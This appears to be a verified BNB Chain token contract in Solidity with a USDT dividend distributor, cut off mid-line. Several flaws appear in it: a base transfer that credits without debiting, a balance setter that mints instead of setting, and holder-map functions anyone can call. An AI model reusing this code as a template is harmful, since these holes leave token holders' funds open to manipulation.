{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-05-15\r\n*/\r\n\r\n// SPDX-License-Identifier: AGPL-3.0-only\r\npragma solidity >=0.8.17;\r\n\r\nabstract contract ERC20 {\r\n    /*//////////////////////////////////////////////////////////////\r\n                                 EVENTS\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 amount);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 amount\r\n    );\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                            METADATA STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    string public name;\r\n\r\n    string public symbol;\r\n\r\n    uint8 public immutable decimals;\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                              ERC20 STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    uint256 public totalSupply;\r\n\r\n    mapping(address => uint256) internal _balanceOf;\r\n\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        decimals = _decimals;\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                               ERC20 LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        allowance[msg.sender][spender] = amount;\r\n\r\n        emit Approval(msg.sender, spender, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function transfer(\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        _transfer(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\r\n\r\n        if (allowed != type(uint256).max)\r\n            allowance[from][msg.sender] = allowed - amount;\r\n\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        // Cannot overflow because the sum of all user\r\n        // balances can't exceed the max uint256 value.\r\n        unchecked {\r\n            _balanceOf[to] += amount;\r\n        }\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function _mint(address to, uint256 amount) internal virtual {\r\n        totalSupply += amount;\r\n\r\n        // Cannot overflow because the sum of all user\r\n        // balances can't exceed the max uint256 value.\r\n        unchecked {\r\n            _balanceOf[to] += amount;\r\n        }\r\n\r\n        emit Transfer(address(0), to, amount);\r\n    }\r\n\r\n    function _burn(address from, uint256 amount) internal virtual {\r\n        _balanceOf[from] -= amount;\r\n\r\n        // Cannot underflow because a user's balance\r\n        // will never be larger than the total supply.\r\n        unchecked {\r\n            totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(from, address(0), amount);\r\n    }\r\n}\r\n\r\nabstract contract Owned {\r\n    /*//////////////////////////////////////////////////////////////\r\n                                 EVENTS\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    event OwnershipTransferred(address indexed user, address indexed newOwner);\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                            OWNERSHIP STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    address public owner;\r\n\r\n    modifier onlyOwner() virtual {\r\n        require(msg.sender == owner, \"UNAUTHORIZED\");\r\n\r\n        _;\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                               CONSTRUCTOR\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                             OWNERSHIP LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        owner = newOwner;\r\n\r\n        emit OwnershipTransferred(msg.sender, newOwner);\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function getAmountsOut(\r\n        uint256 amountIn,\r\n        address[] calldata path\r\n    ) external view returns (uint256[] memory amounts);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapExactETHForTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint[] memory amounts);\r\n\r\n    function swapTokensForExactETH(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapExactTokensForETH(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapETHForExactTokens(\r\n        uint amountOut,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `to`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `from` to `to` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n}\r\n\r\nlibrary SafeMathUint {\r\n    function toInt256Safe(uint256 a) internal pure returns (int256) {\r\n        int256 b = int256(a);\r\n        require(b >= 0);\r\n        return b;\r\n    }\r\n}\r\n\r\nlibrary SafeMathInt {\r\n    int256 private constant MIN_INT256 = int256(1) << 255;\r\n    int256 private constant MAX_INT256 = ~(int256(1) << 255);\r\n\r\n    /**\r\n     * @dev Multiplies two int256 variables and fails on overflow.\r\n     */\r\n    function mul(int256 a, int256 b) internal pure returns (int256) {\r\n        int256 c = a * b;\r\n\r\n        // Detect overflow when multiplying MIN_INT256 with -1\r\n        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));\r\n        require((b == 0) || (c / b == a));\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Division of two int256 variables and fails on overflow.\r\n     */\r\n    function div(int256 a, int256 b) internal pure returns (int256) {\r\n        // Prevent overflow when dividing MIN_INT256 by -1\r\n        require(b != -1 || a != MIN_INT256);\r\n\r\n        // Solidity already throws when dividing by 0.\r\n        return a / b;\r\n    }\r\n\r\n    /**\r\n     * @dev Subtracts two int256 variables and fails on overflow.\r\n     */\r\n    function sub(int256 a, int256 b) internal pure returns (int256) {\r\n        int256 c = a - b;\r\n        require((b >= 0 && c <= a) || (b < 0 && c > a));\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Adds two int256 variables and fails on overflow.\r\n     */\r\n    function add(int256 a, int256 b) internal pure returns (int256) {\r\n        int256 c = a + b;\r\n        require((b >= 0 && c >= a) || (b < 0 && c < a));\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Converts to absolute value, and fails on overflow.\r\n     */\r\n    function abs(int256 a) internal pure returns (int256) {\r\n        require(a != MIN_INT256);\r\n        return a < 0 ? -a : a;\r\n    }\r\n\r\n    function toUint256Safe(int256 a) internal pure returns (uint256) {\r\n        require(a >= 0);\r\n        return uint256(a);\r\n    }\r\n}\r\n\r\nabstract contract N_ERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 amount);\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                            METADATA STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    string public name;\r\n\r\n    string public symbol;\r\n\r\n    uint8 public immutable decimals;\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                              ERC20 STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    uint256 public totalSupply;\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n\r\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        decimals = _decimals;\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n    INTERNAL MINT/BURN LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    function _mint(address to, uint256 amount) internal virtual {\r\n        totalSupply += amount;\r\n\r\n        // Cannot overflow because the sum of all user\r\n        // balances can't exceed the max uint256 value.\r\n        unchecked {\r\n            balanceOf[to] += amount;\r\n        }\r\n\r\n        emit Transfer(address(0), to, amount);\r\n    }\r\n\r\n    function _burn(address from, uint256 amount) internal virtual {\r\n        balanceOf[from] -= amount;\r\n\r\n        // Cannot underflow because a user's balance\r\n        // will never be larger than the total supply.\r\n        unchecked {\r\n            totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(from, address(0), amount);\r\n    }\r\n}\r\n\r\nabstract contract DividendPayingToken is N_ERC20, Owned {\r\n    using SafeMath for uint256;\r\n    using SafeMathUint for uint256;\r\n    using SafeMathInt for int256;\r\n\r\n    address public immutable dToken;\r\n\r\n    // With `magnitude`, we can properly distribute dividends even if the amount of received ether is small.\r\n    // For more discussion about choosing the value of `magnitude`,\r\n    //  see https://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728\r\n    uint256 internal constant magnitude = 2 ** 128;\r\n\r\n    uint256 internal magnifiedDividendPerShare;\r\n\r\n    // About dividendCorrection:\r\n    // If the token balance of a `_user` is never changed, the dividend of `_user` can be computed with:\r\n    //   `dividendOf(_user) = dividendPerShare * balanceOf(_user)`.\r\n    // When `balanceOf(_user)` is changed (via minting/burning/transferring tokens),\r\n    //   `dividendOf(_user)` should not be changed,\r\n    //   but the computed value of `dividendPerShare * balanceOf(_user)` is changed.\r\n    // To keep the `dividendOf(_user)` unchanged, we add a correction term:\r\n    //   `dividendOf(_user) = dividendPerShare * balanceOf(_user) + dividendCorrectionOf(_user)`,\r\n    //   where `dividendCorrectionOf(_user)` is updated whenever `balanceOf(_user)` is changed:\r\n    //   `dividendCorrectionOf(_user) = dividendPerShare * (old balanceOf(_user)) - (new balanceOf(_user))`.\r\n    // So now `dividendOf(_user)` returns the same value before and after `balanceOf(_user)` is changed.\r\n    mapping(address => int256) internal magnifiedDividendCorrections;\r\n    mapping(address => uint256) internal withdrawnDividends;\r\n\r\n    uint256 public totalDividendsDistributed;\r\n\r\n    constructor(\r\n        string memory _name,\r\n        string memory _symbol,\r\n        address _dToken\r\n    ) N_ERC20(_name, _symbol, 18) {\r\n        dToken = _dToken;\r\n    }\r\n\r\n    function distributeDividends(uint256 amount) public onlyOwner {\r\n        require(totalSupply > 0);\r\n\r\n        if (amount > 0) {\r\n            magnifiedDividendPerShare = magnifiedDividendPerShare.add(\r\n                (amount).mul(magnitude) / totalSupply\r\n            );\r\n            totalDividendsDistributed = totalDividendsDistributed.add(amount);\r\n        }\r\n    }\r\n\r\n    /// @notice Withdraws the ether distributed to the sender.\r\n    /// @dev It emits a `DividendWithdrawn` event if the amount of withdrawn ether is greater than 0.\r\n    function withdrawDividend() public virtual {\r\n        _withdrawDividendOfUser(msg.sender);\r\n    }\r\n\r\n    /// @notice Withdraws the ether distributed to the sender.\r\n    /// @dev It emits a `DividendWithdrawn` event if the amount of withdrawn ether is greater than 0.\r\n    function _withdrawDividendOfUser(address user) internal returns (uint256) {\r\n        uint256 _withdrawableDividend = withdrawableDividendOf(user);\r\n        if (_withdrawableDividend > 0) {\r\n            withdrawnDividends[user] = withdrawnDividends[user].add(\r\n                _withdrawableDividend\r\n            );\r\n            bool success = IERC20(dToken).transfer(user, _withdrawableDividend);\r\n\r\n            if (!success) {\r\n                withdrawnDividends[user] = withdrawnDividends[user].sub(\r\n                    _withdrawableDividend\r\n                );\r\n                return 0;\r\n            }\r\n\r\n            return _withdrawableDividend;\r\n        }\r\n\r\n        return 0;\r\n    }\r\n\r\n    /// @notice View the amount of dividend in wei that an address can withdraw.\r\n    /// @param _owner The address of a token holder.\r\n    /// @return The amount of dividend in wei that `_owner` can withdraw.\r\n    function dividendOf(address _owner) public view returns (uint256) {\r\n        return withdrawableDividendOf(_owner);\r\n    }\r\n\r\n    /// @notice View the amount of dividend in wei that an address can withdraw.\r\n    /// @param _owner The address of a token holder.\r\n    /// @return The amount of dividend in wei that `_owner` can withdraw.\r\n    function withdrawableDividendOf(\r\n        address _owner\r\n    ) public view returns (uint256) {\r\n        return accumulativeDividendOf(_owner).sub(withdrawnDividends[_owner]);\r\n    }\r\n\r\n    /// @notice View the amount of dividend in wei that an address has withdrawn.\r\n    /// @param _owner The address of a token holder.\r\n    /// @return The amount of dividend in wei that `_owner` has withdrawn.\r\n    function withdrawnDividendOf(address _owner) public view returns (uint256) {\r\n        return withdrawnDividends[_owner];\r\n    }\r\n\r\n    /// @notice View the amount of dividend in wei that an address has earned in total.\r\n    /// @dev accumulativeDividendOf(_owner) = withdrawableDividendOf(_owner) + withdrawnDividendOf(_owner)\r\n    /// = (magnifiedDividendPerShare * balanceOf(_owner) + magnifiedDividendCorrections[_owner]) / magnitude\r\n    /// @param _owner The address of a token holder.\r\n    /// @return The amount of dividend in wei that `_owner` has earned in total.\r\n    function accumulativeDividendOf(\r\n        address _owner\r\n    ) public view returns (uint256) {\r\n        return\r\n            magnifiedDividendPerShare\r\n                .mul(balanceOf[_owner])\r\n                .toInt256Safe()\r\n                .add(magnifiedDividendCorrections[_owner])\r\n                .toUint256Safe() / magnitude;\r\n    }\r\n\r\n    /// @param account The account that will receive the created tokens.\r\n    /// @param value The amount that will be created.\r\n    function _mint(address account, uint256 value) internal override {\r\n        super._mint(account, value);\r\n\r\n        magnifiedDividendCorrections[account] = magnifiedDividendCorrections[\r\n            account\r\n        ].sub((magnifiedDividendPerShare.mul(value)).toInt256Safe());\r\n    }\r\n\r\n    /// @dev Internal function that burns an amount of the token of a given account.\r\n    /// Update magnifiedDividendCorrections to keep dividends unchanged.\r\n    /// @param account The account whose tokens will be burnt.\r\n    /// @param value The amount that will be burnt.\r\n    function _burn(address account, uint256 value) internal override {\r\n        super._burn(account, value);\r\n\r\n        magnifiedDividendCorrections[account] = magnifiedDividendCorrections[\r\n            account\r\n        ].add((magnifiedDividendPerShare.mul(value)).toInt256Safe());\r\n    }\r\n\r\n    function _setBalance(address account, uint256 newBalance) internal {\r\n        _mint(account, newBalance);\r\n    }\r\n}\r\n\r\ncontract DividendDistributor is Owned, DividendPayingToken {\r\n    using SafeMath for uint256;\r\n    using SafeMathInt for int256;\r\n    struct MAP {\r\n        address[] keys;\r\n        mapping(address => uint256) values;\r\n        mapping(address => uint256) indexOf;\r\n        mapping(address => bool) inserted;\r\n    }\r\n\r\n    MAP private tokenHoldersMap;\r\n    uint256 public lastProcessedIndex;\r\n\r\n    mapping(address => bool) public excludedFromDividends;\r\n\r\n    mapping(address => uint256) public lastClaimTimes;\r\n\r\n    uint256 public claimWait;\r\n    uint256 public minimumTokenBalanceForDividends;\r\n\r\n    event ExcludeFromDividends(address indexed account);\r\n    event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);\r\n\r\n    event Claim(\r\n        address indexed account,\r\n        uint256 amount,\r\n        bool indexed automatic\r\n    );\r\n\r\n    constructor(\r\n        address dT,\r\n        uint256 _claimWait,\r\n        uint256 _minimumTokenBalanceForDividends\r\n    )\r\n        Owned(msg.sender)\r\n        DividendPayingToken(\"d_Dividen_Tracker\", \"d_Dividend_Tracker\", dT)\r\n    {\r\n        claimWait = _claimWait;\r\n        minimumTokenBalanceForDividends = _minimumTokenBalanceForDividends;\r\n    }\r\n\r\n    function withdrawDividend() public pure override {\r\n        require(\r\n            false,\r\n            \"d_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main d contract.\"\r\n        );\r\n    }\r\n\r\n    function setMinimumTokenBalanceForDividends(\r\n        uint256 val\r\n    ) external onlyOwner {\r\n        minimumTokenBalanceForDividends = val;\r\n    }\r\n\r\n    function excludeFromDividends(address account) external onlyOwner {\r\n        require(!excludedFromDividends[account]);\r\n        excludedFromDividends[account] = true;\r\n\r\n        balanceOf[account] = 0;\r\n        MAPRemove(account);\r\n\r\n        emit ExcludeFromDividends(account);\r\n    }\r\n\r\n    function updateClaimWait(uint256 newClaimWait) external onlyOwner {\r\n        require(\r\n            newClaimWait >= 100 && newClaimWait <= 86400,\r\n            \"d_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours\"\r\n        );\r\n        require(\r\n            newClaimWait != claimWait,\r\n            \"d_Dividend_Tracker: Cannot update claimWait to same value\"\r\n        );\r\n        emit ClaimWaitUpdated(newClaimWait, claimWait);\r\n        claimWait = newClaimWait;\r\n    }\r\n\r\n    function transferUSDT(address to, uint256 amount) external onlyOwner {\r\n        IERC20(USDT).transfer(to, amount);\r\n    }\r\n\r\n    function getLastProcessedIndex() external view returns (uint256) {\r\n        return lastProcessedIndex;\r\n    }\r\n\r\n    function getNumberOfTokenHolders() external view returns (uint256) {\r\n        return tokenHoldersMap.keys.length;\r\n    }\r\n\r\n    function getAccount(\r\n        address _account\r\n    )\r\n        public\r\n        view\r\n        returns (\r\n            address account,\r\n            int256 index,\r\n            int256 iterationsUntilProcessed,\r\n            uint256 withdrawableDividends,\r\n            uint256 totalDividends,\r\n            uint256 lastClaimTime,\r\n            uint256 nextClaimTime,\r\n            uint256 secondsUntilAutoClaimAvailable\r\n        )\r\n    {\r\n        account = _account;\r\n\r\n        index = MAPGetIndexOfKey(account);\r\n\r\n        iterationsUntilProcessed = -1;\r\n\r\n        if (index >= 0) {\r\n            if (uint256(index) > lastProcessedIndex) {\r\n                iterationsUntilProcessed = index.sub(\r\n                    int256(lastProcessedIndex)\r\n                );\r\n            } else {\r\n                uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length >\r\n                    lastProcessedIndex\r\n                    ? tokenHoldersMap.keys.length.sub(lastProcessedIndex)\r\n                    : 0;\r\n\r\n                iterationsUntilProcessed = index.add(\r\n                    int256(processesUntilEndOfArray)\r\n                );\r\n            }\r\n        }\r\n\r\n        withdrawableDividends = withdrawableDividendOf(account);\r\n        totalDividends = accumulativeDividendOf(account);\r\n\r\n        lastClaimTime = lastClaimTimes[account];\r\n\r\n        nextClaimTime = lastClaimTime > 0 ? lastClaimTime.add(claimWait) : 0;\r\n\r\n        secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp\r\n            ? nextClaimTime.sub(block.timestamp)\r\n            : 0;\r\n    }\r\n\r\n    function getAccountAtIndex(\r\n        uint256 index\r\n    )\r\n        public\r\n        view\r\n        returns (\r\n            address,\r\n            int256,\r\n            int256,\r\n            uint256,\r\n            uint256,\r\n            uint256,\r\n            uint256,\r\n            uint256\r\n        )\r\n    {\r\n        if (index >= MAPSize()) {\r\n            return (\r\n                0x0000000000000000000000000000000000000000,\r\n                -1,\r\n                -1,\r\n                0,\r\n                0,\r\n                0,\r\n                0,\r\n                0\r\n            );\r\n        }\r\n\r\n        address account = MAPGetKeyAtIndex(index);\r\n\r\n        return getAccount(account);\r\n    }\r\n\r\n    function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {\r\n        if (lastClaimTime > block.timestamp) {\r\n            return false;\r\n        }\r\n\r\n        return block.timestamp.sub(lastClaimTime) >= claimWait;\r\n    }\r\n\r\n    function setBalance(\r\n        address account,\r\n        uint256 newBalance\r\n    ) external onlyOwner {\r\n        if (excludedFromDividends[account]) {\r\n            return;\r\n        }\r\n\r\n        if (newBalance == 0) {\r\n            _burn(account, balanceOf[account]);\r\n            MAPRemove(account);\r\n        } else {\r\n            if (newBalance >= minimumTokenBalanceForDividends) {\r\n                _setBalance(account, newBalance);\r\n                MAPSet(account, newBalance + balanceOf[account]);\r\n            }\r\n            if (canAutoClaim(lastClaimTimes[account])) {\r\n                processAccount(account, true);\r\n            }\r\n        }\r\n    }\r\n\r\n    function process(uint256 gas) public returns (uint256, uint256, uint256) {\r\n        uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;\r\n\r\n        if (numberOfTokenHolders == 0) {\r\n            return (0, 0, lastProcessedIndex);\r\n        }\r\n\r\n        uint256 _lastProcessedIndex = lastProcessedIndex;\r\n\r\n        uint256 gasUsed = 0;\r\n\r\n        uint256 gasLeft = gasleft();\r\n\r\n        uint256 iterations = 0;\r\n        uint256 claims = 0;\r\n\r\n        while (gasUsed < gas && iterations < numberOfTokenHolders) {\r\n            _lastProcessedIndex++;\r\n\r\n            if (_lastProcessedIndex >= tokenHoldersMap.keys.length) {\r\n                _lastProcessedIndex = 0;\r\n            }\r\n\r\n            address account = tokenHoldersMap.keys[_lastProcessedIndex];\r\n\r\n            if (canAutoClaim(lastClaimTimes[account])) {\r\n                if (processAccount(account, true)) {\r\n                    claims++;\r\n                }\r\n            }\r\n\r\n            iterations++;\r\n\r\n            uint256 newGasLeft = gasleft();\r\n\r\n            if (gasLeft > newGasLeft) {\r\n                gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));\r\n            }\r\n\r\n            gasLeft = newGasLeft;\r\n        }\r\n\r\n        lastProcessedIndex = _lastProcessedIndex;\r\n\r\n        return (iterations, claims, lastProcessedIndex);\r\n    }\r\n\r\n    function processAccount(\r\n        address account,\r\n        bool automatic\r\n    ) public onlyOwner returns (bool) {\r\n        uint256 amount = _withdrawDividendOfUser(account);\r\n\r\n        if (amount > 0) {\r\n            lastClaimTimes[account] = block.timestamp;\r\n            emit Claim(account, amount, automatic);\r\n            return true;\r\n        }\r\n\r\n        return false;\r\n    }\r\n\r\n    function MAPGet(address key) public view returns (uint256) {\r\n        return tokenHoldersMap.values[key];\r\n    }\r\n\r\n    function MAPGetIndexOfKey(address key) public view returns (int256) {\r\n        if (!tokenHoldersMap.inserted[key]) {\r\n            return -1;\r\n        }\r\n        return int256(tokenHoldersMap.indexOf[key]);\r\n    }\r\n\r\n    function MAPGetKeyAtIndex(uint256 index) public view returns (address) {\r\n        return tokenHoldersMap.keys[index];\r\n    }\r\n\r\n    function MAPSize() public view returns (uint256) {\r\n        return tokenHoldersMap.keys.length;\r\n    }\r\n\r\n    function MAPSet(address key, uint256 val) public {\r\n        if (tokenHoldersMap.inserted[key]) {\r\n            tokenHoldersMap.values[key] = val;\r\n        } else {\r\n            tokenHoldersMap.inserted[key] = true;\r\n            tokenHoldersMap.values[key] = val;\r\n            tokenHoldersMap.indexOf[key] = tokenHoldersMap.keys.length;\r\n            tokenHoldersMap.keys.push(key);\r\n        }\r\n    }\r\n\r\n    function MAPRemove(address key) public {\r\n        if (!tokenHoldersMap.inserted[key]) {\r\n            return;\r\n        }\r\n\r\n        delete tokenHoldersMap.inserted[key];\r\n        delete tokenHoldersMap.values[key];\r\n\r\n        uint256 index = tokenHoldersMap.indexOf[key];\r\n        uint256 lastIndex = tokenHoldersMap.keys.length - 1;\r\n        address lastKey = tokenHoldersMap.keys[lastIndex];\r\n\r\n        tokenHoldersMap.indexOf[lastKey] = index;\r\n        delete tokenHoldersMap.indexOf[key];\r\n\r\n        tokenHoldersMap.keys[index] = lastKey;\r\n        tokenHoldersMap.keys.pop();\r\n    }\r\n}\r\n\r\naddress constant USDT = 0x55d398326f99059fF775485246999027B3197955;\r\naddress constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\nabstract contract DexBaseUSDT {\r\n    bool public inSwapAndLiquify;\r\n    IUniswapV2Router constant uniswapV2Router = IUniswapV2Router(ROUTER);\r\n    address public immutable uniswapV2Pair;\r\n    DividendDistributor public immutable distributor;\r\n\r\n    modifier lockTheSwap() {\r\n        inSwapAndLiquify = true;\r\n        _;\r\n        inSwapAndLiquify = false;\r\n    }\r\n\r\n    constructor() {\r\n        distributor = new DividendDistributor(USDT, 2 hours, 0.001 ether);\r\n        distributor.setBalance(address(this), 0.01 ether);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(\r\n            address(this),\r\n            USDT\r\n        );\r\n    }\r\n}\r\n\r\nabstract contract LpUSDTfee is Owned, DexBaseUSDT, ERC20 {\r\n    mapping(address => bool) public isDividendExempt;\r\n    mapping(address => bool) public isInShareholders;\r\n    uint256 public minPeriod = 2 hours;\r\n    uint256 public lastLPFeefenhongTime;\r\n    address private fromAddress;\r\n    address private toAddress;\r\n    uint256 distributorGas = 200000;\r\n    address[] public shareholders;\r\n    uint256 currentIndex;\r\n    mapping(address => uint256) public shareholderIndexes;\r\n    uint256 public minDistribution;\r\n\r\n    constructor(uint256 _minDistribution) {\r\n        minDistribution = _minDistribution;\r\n        isDividendExempt[address(0)] = true;\r\n        isDividendExempt[address(0xdead)] = true;\r\n    }\r\n\r\n    function excludeFromDividend(address account) external onlyOwner {\r\n        isDividendExempt[account] = true;\r\n    }\r\n\r\n    function setDistributionCriteria(\r\n        uint256 _minPeriod,\r\n        uint256 _minDistribution\r\n    ) external onlyOwner {\r\n        minPeriod = _minPeriod;\r\n        minDistribution = _minDistribution;\r\n    }\r\n\r\n    function setUsers(address sender, address recipient) internal {\r\n        if (fromAddress == address(0)) fromAddress = sender;\r\n        if (toAddress == address(0)) toAddress = recipient;\r\n        if (!isDividendExempt[fromAddress] && fromAddress != 